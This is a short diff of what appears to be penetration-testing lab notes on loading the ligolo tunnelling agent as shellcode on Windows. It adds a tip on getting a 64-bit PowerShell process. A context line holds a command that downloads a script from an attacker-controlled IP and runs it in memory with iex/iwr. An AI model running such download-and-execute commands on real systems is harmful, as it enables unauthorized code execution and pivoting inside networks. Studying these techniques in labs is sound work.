@@ -21,7 +21,9 @@ Make sure to convert agent.exe of ligolo to shellcode:
 
 Make sure you are running as x64 bit process before running: 
 - Powershell - `[Environment]::Is64BitProcess`
-- CMD - `set p` (Should show PROCESSOR_ARCHITECTURE=AMD64) 
+- CMD - `set p` (Should show PROCESSOR_ARCHITECTURE=AMD64)
+
+If you are in 32bit process, run: `%windir%\sysnative\WindowsPowerShell\v1.0\powershell.exe` - then check again.
 
 Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
 
